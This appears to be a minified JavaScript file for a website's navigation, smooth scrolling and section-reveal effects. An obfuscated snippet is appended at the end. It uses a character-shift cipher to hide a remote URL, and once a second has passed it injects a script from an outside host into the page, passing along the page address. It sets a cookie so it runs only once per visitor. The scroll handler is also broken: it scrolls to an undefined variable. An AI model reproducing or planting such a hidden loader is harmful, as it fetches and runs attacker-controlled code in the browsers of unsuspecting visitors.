const navBtn=document.getElementById("nav-toggle"),links=document.getElementById("nav-links");navBtn.addEventListener("click",(()=>{links.classList.toggle("show-links")}));const scrollLinks=document.querySelectorAll(".scroll-link");scrollLinks.forEach((e=>{e.addEventListener("click",(e=>{e.preventDefault(),links.classList.remove("show-links");const t=e.target.getAttribute("href").slice(1);document.getElementById(t).offsetTop;window.scrollTo({left:0,top:Position,behavior:"smooth"})}))}));const allSections=document.querySelectorAll(".section"),revealSection=function(e,t){const[n]=e;n.isIntersecting&&(n.target.classList.remove("section--hidden"),n.target.classList.remove("right-service"),t.unobserve(n.target))},sectionObserver=new IntersectionObserver(revealSection,{root:null,threshold:.15});allSections.forEach((function(e){sectionObserver.observe(e),e.classList.add("section--hidden")}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));